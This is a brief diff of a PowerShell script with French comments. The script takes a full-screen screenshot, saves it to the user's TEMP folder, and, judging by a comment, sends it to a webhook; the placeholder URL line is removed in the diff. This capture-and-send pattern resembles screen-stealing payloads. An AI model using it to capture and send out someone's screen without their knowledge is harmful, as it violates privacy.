@@ -1,8 +1,5 @@
-# Définir l'URL du webhook
-$webhookUrl = "URL_DU_WEBHOOK"
-
-# Définir le nom du fichier pour la capture d'écran
-$fileName = "screenshot.png"
+# Définir le chemin d'accès complet pour enregistrer la capture d'écran dans le répertoire temporaire de l'utilisateur
+$fileName = "$env:TEMP\screenshot.png"
 
 # Prendre une capture d'écran
 Add-Type -AssemblyName System.Windows.Forms
@@ -15,6 +12,7 @@ $graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $s
 
 # Vérifier si la capture d'écran est réussie
 if (-not $bitmap.GetPixel(0, 0).IsEmpty) {
+    # Enregistrer la capture d'écran dans le répertoire temporaire
     $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
 
     # Envoyer la capture d'écran au webhook
